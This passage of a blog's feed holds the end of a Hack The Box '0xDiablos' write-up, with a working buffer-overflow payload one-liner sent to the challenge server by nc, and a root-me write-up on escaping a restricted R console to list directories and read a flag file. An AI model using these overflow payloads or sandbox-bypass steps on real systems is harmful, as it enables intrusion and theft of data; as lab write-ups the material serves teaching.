&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21524111&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3f212ff3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[...&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;snip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;which is similar to the line we analyzed with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdump&lt;/code&gt;, where it compares the values of two registers with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$0xc0ded00d&lt;/code&gt;. To trigger this if statement, we need to concatenate these addresses in our payload. Hopefully, this solves the challenge!&lt;/p&gt;

&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;
&lt;p&gt;Let’s test our new payload locally:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import sys; sys.stdout.buffer.write(b&apos;A&apos;*188 + b&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&apos; + b&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ef&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;de&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;de&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&apos;)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; payload2.bin&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;payload2.bin | ./vulnYou know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAA�ﾭ�
Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that it did not work correctly. This is because we need to pass the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;param1&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;param2&lt;/code&gt; as function parameters. In order to pass them as a parameter, we need to populate the EIP register with an address. This address can essentially be anything, but its size in bytes matter. The final payload would then be:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb :&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import sys; sys.stdout.buffer.write(b&apos;A&apos;*188 + b&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&apos; + b&apos;mula&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ef&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;de&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;de&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&apos;)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; payload2.bin
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;payload2.bin | ./vuln
You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAA�mulaﾭ�
hi mom
Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, we now print the value of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt;. This adjustment was made such that it would align the stack for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function to understand our paramters.&lt;/p&gt;

&lt;p&gt;Let’s try in the server now!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;^C&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;payload2.bin - | nc 167.99.82.136 31987
You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAA�mulaﾭ�
HTB&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;redacted&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;And there is our flag!&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;In this CTF, we learned a lot more about reverse engineering, GDB and how to exploit a simple buffer overflow. As we can see, reverse engineering exploitation is extremely hard and troublesome, even in its simpler form.&lt;/p&gt;

&lt;p&gt;I hope you learned something knew today, and as always, never forget to do your &lt;strong&gt;research&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Sat, 30 Dec 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000//0xdiablos-htb</link>
        <link href="http://localhost:4000/0xdiablos-htb"/>
        <guid isPermaLink="true">http://localhost:4000/0xdiablos-htb</guid>
      </item>
    
      <item>
        <title>R Code Execution - root-me.org</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Long time no see! It’s been a while since I last posted. But now that we are back, let’s solve another &lt;a href=&quot;https://www.root-me.org&quot;&gt;Root-me&lt;/a&gt; CTF! This time, we are going to attack the R: Command Execution, under the app. I never programmed in R before, so this might be a tricky one for me. We might need to do a good research on this.&lt;/p&gt;

&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
&lt;p&gt;Let’s check the statement:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Statement&lt;/p&gt;

  &lt;p&gt;Your Statistical Analysis Reviews in R are approaching. Your teacher has made an R interpreter available on the ENT of the university so that you can practice. You don’t have time to revise, you decide to steal the exam papers.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Alright! We are playing the cheater’s role this time. To start this challenge, we need to click on a button “Start the challenge”. No need to ssh this time. After clicking the button, we arrive at a R console:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec.png&quot; alt=&quot;R Console&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;As always, let’s keep the following approach mindset:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Understanding basic concepts&lt;/li&gt;
  &lt;li&gt;Understanding the problem&lt;/li&gt;
  &lt;li&gt;Crafting an attack&lt;/li&gt;
  &lt;li&gt;Solving&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;

&lt;p&gt;Ok. First of all, we need to learn how to interact with this console. I’ll try be brief and show all of my attempts. Suppose we are ignorant in R (as I am). My first command in this console was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;, which gave me the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec2.png&quot; alt=&quot;Output of ls in console&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To me, this seemed as an error message. But after a bit of research, I found that it wasn’t. You see, in R, when we define a function, say one like this:&lt;/p&gt;

&lt;div class=&quot;language-R highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;my_func&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Hi mom&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;we call it by writing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;my_func()&lt;/code&gt;. However, if we instead write &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;my_func&lt;/code&gt;, we will get the function gist instead. We can test this with the console:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec3.png&quot; alt=&quot;my_func() vs my_func&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;my_func()&lt;/code&gt; calls the function and executes it, while &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;my_func&lt;/code&gt; returns the function definition. This means &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls()&lt;/code&gt; is a function and we got its definition when we typed in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; without the ().
Another interesting thing we can use here is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; operator. If we type in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&amp;lt;function&amp;gt;&lt;/code&gt;, we get the function’s documentation. You can learn more about this &lt;a href=&quot;https://www.r-project.org/help.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This means we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?ls&lt;/code&gt; to see what it does:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec4.png&quot; alt=&quot;?ls output&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aha. So it basically prints out the user defined functions in the current environment. We can check out which functions we can use with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls()&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec5.png&quot; alt=&quot;ls() output&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nice, we have a list of functions we can try to use and see what happens. We have to keep in mind our objective, which is to retrieve the exam for us to pass without studying! To do so, we need to enumerate this system and find the exam file. From the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls()&lt;/code&gt; output, we might want to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list.dirs&lt;/code&gt; to check the directory contents. Let’s see the outputs of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list.dirs&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list.dirs()&lt;/code&gt; respectively:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec6.png&quot; alt=&quot;list.dirs output&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Interesting. This function is telling us that not only it is a fake function, as it is defined to only print this message, but also that we cannot use it to list the directories. However, if we look into &lt;a href=&quot;https://www.geeksforgeeks.org/obtain-list-of-directories-in-r/&quot;&gt;this&lt;/a&gt; reference, the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list.dirs()&lt;/code&gt; is actually implemented in an R environment. This also tells us that the environment we are in overwrote the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list.dirs()&lt;/code&gt; with this custom message function.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls()&lt;/code&gt; command output indicates that user-defined functions have replaced the standard ones, effectively restricting their use. Just for the sake of completeness, let’s check all of these functions:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec7.png&quot; alt=&quot;user defined functions&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As expected…&lt;/p&gt;

&lt;h2 id=&quot;-step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt; Step 2 - Understanding the problem&lt;/h2&gt;

&lt;p&gt;With a better understanding of the R console environment, let’s identify our objectives and recognize the limitations we’re facing.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;We need to find the exam file, but we cannot use the standard functions to do so. Which leads to 2.&lt;/li&gt;
  &lt;li&gt;We need to find other ways to list directories and read files.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;After a bit of research, I’ve stumble upon &lt;a href=&quot;https://stat.ethz.ch/R-manual/R-devel/library/base/html/list.files.html&quot;&gt;this&lt;/a&gt; article. In it, we can see that there is a function called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dir()&lt;/code&gt; which is an alias to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list.files&lt;/code&gt;. According to the definition, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dir&lt;/code&gt; should give:&lt;/p&gt;

&lt;div class=&quot;language-R highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all.files&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;full.names&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recursive&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ignore.case&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;include.dirs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no..&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s see if this is enabled in our environment:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec8.png&quot; alt=&quot;dir output&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aha! This function is properly defined and we might be able to use it to list files in the system! Let’s check it out:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec9.png&quot; alt=&quot;dir output&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Amazing! We found a vector to list files. It seems we are inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt; directory of this website. Now we need a way to read files and print them into the output. To do so, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readLines&lt;/code&gt; function instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read.delim&lt;/code&gt;. Check &lt;a href=&quot;https://stackoverflow.com/questions/12626637/read-a-text-file-in-r-line-by-line&quot;&gt;this&lt;/a&gt; resource for more info on that.&lt;/p&gt;

&lt;p&gt;Let’s try this snippet:&lt;/p&gt;

&lt;div class=&quot;language-R highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readLines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;con&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;index.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is what we get:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec10.png&quot; alt=&quot;attempt to read index.php&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Alright. We our way to list files and read them. This should be enough. Let’s start our hunt for the exam file now!&lt;/p&gt;

&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;

&lt;p&gt;In order to craft our attack, we need to start listing the files in each directory that the exam should probably be. Let’s use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dir()&lt;/code&gt; for that. This time, however, let’s use the arguments &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;path&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;all.files&lt;/code&gt; of this method. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;path&lt;/code&gt; argument’s default value is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt;, the current directory. We can manipulate this to navigate and list files in this system:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec11.png&quot; alt=&quot;attempt to read index.php&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This shows the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; directory. In CTFs, flags are usually inside the home directory. Let’s navigate into it and list its contents:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec12.png&quot; alt=&quot;attempt to read index.php&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One step further:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec13.png&quot; alt=&quot;attempt to read index.php&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And one more:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec14.png&quot; alt=&quot;attempt to read index.php&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since the problem states we are taking the exam in the future, it might be inside the latest year directory, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2021&lt;/code&gt;. Let’s go one step further:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec15.png&quot; alt=&quot;attempt to read index.php&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There we have it! Our flag.txt file! Now, we just need to solve this by reading its contents.&lt;/p&gt;

&lt;h2 id=&quot;-step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt; Step 4 - Solving!&lt;/h2&gt;

&lt;p&gt;To solve this, we just need to read the flag.txt contents. To do so, we run:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/R-exec16.png&quot; alt=&quot;attempt to read index.php&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And there we have it. Our flag!&lt;/p&gt;

&lt;h1 id=&quot;-conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt; Conclusion&lt;/h1&gt;

&lt;p&gt;In this CTF we learned more about R programming language and how a cheater might do anything to circumvent system security to pass an exam! Jokes aside, this was an amazing CTF, where we put into test our abilities to adapt and find ways through new environments.&lt;/p&gt;

&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Fri, 22 Dec 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000//R-command-execution-root-me</link>
